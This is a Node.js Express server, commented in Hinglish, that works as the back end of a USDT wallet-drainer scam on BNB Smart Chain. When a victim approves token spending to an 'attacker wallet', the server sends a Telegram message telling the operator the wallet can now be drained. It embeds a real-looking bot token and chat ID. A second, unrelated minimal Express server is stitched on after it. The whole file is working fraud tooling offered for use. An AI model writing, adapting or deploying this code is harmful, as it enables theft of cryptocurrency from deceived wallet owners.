const express = require('express');
const ethers = require('ethers');
const axios = require('axios');

const app = express();
app.use(express.json());

// --- CONFIGURATION (APNI DETAILS SE BHARA GAYA HAI) ---
const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
const provider = new ethers.JsonRpcProvider(BSC_RPC_URL);

// USDT ka BEP20 contract address
const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const USDT_ABI = [
    "function approve(address spender, uint256 amount)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

// 👇 APNA ATTACKER WALLET ADDRESS (BEP20)
const ATTACKER_WALLET_ADDRESS = '0x2fe1b019ae3a4597b432e4c4A1f072824DAeb5bE';

// 👇 APNA TELEGRAM BOT TOKEN
const TELEGRAM_BOT_TOKEN = '8288862537:AAHncsDNbs1cmPSpZw9xmRThKpTRCB4Ai5o';

// 👇 APNA TELEGRAM CHAT ID
const TELEGRAM_CHAT_ID = '8279031914';
// --- CONFIGURATION END ---


// API Endpoint: Jab victim approve karta hai, toh yeh function notification bhejega
app.post('/api/approval-success', async (req, res) => {
    const { victimAddress, txHash } = req.body;

    if (!victimAddress || !txHash) {
        return res.status(400).json({ error: 'Victim address and transaction hash are required.' });
    }

    console.log(`[+] Approval received from: ${victimAddress}`);

    // Telegram message banayein
    const message = `
🔥 **VICTIM APPROVED!** 🔥

👤 **Victim Wallet:** \`${victimAddress}\`
🔗 **Approval TX:** [View on BscScan](https://bscscan.com/tx/${txHash})
💰 **Spender (You):** \`${ATTACKER_WALLET_ADDRESS}\`

⚠️ Now you can drain the USDT from this wallet.
    `;

    try {
        // Telegram par notification bhejein
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        console.log('[+] Telegram notification sent successfully!');
        res.status(200).json({ status: 'success', message: 'Notification sent.' });

    } catch (error) {
        console.error('[-] Error sending Telegram notification:', error);
        res.status(500).json({ error: 'Failed to send notification.' });
    }
});


// Server start karein
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`[+] Approval Notification Backend is running on port ${PORT}`);
    console.log(`[+] Attacker Address: ${ATTACKER_WALLET_ADDRESS}`);
    console.log(`[+] Telegram Chat ID: ${TELEGRAM_CHAT_ID}`);
});const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send("Server running");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server started on port " + PORT);
});